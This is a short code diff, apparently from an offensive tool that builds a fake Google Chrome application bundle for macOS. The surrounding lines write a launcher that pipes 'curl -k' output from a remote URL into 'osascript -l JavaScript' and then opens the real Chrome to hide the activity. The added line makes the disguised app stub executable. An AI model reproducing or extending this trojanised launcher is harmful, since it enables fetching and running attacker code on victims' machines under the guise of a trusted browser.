@@ -76,6 +76,7 @@ def dmg():
         chromefile.write("curl -k %s | osascript -l JavaScript &"%url)
         chromefile.write("\n")
         chromefile.write('open -a "Google Chrome"\n')
+        os.system("chmod +x " + payload + "/Chrome.app/Contents/MacOS/Application\ Stub")
     
     async def main():
         await scripting()
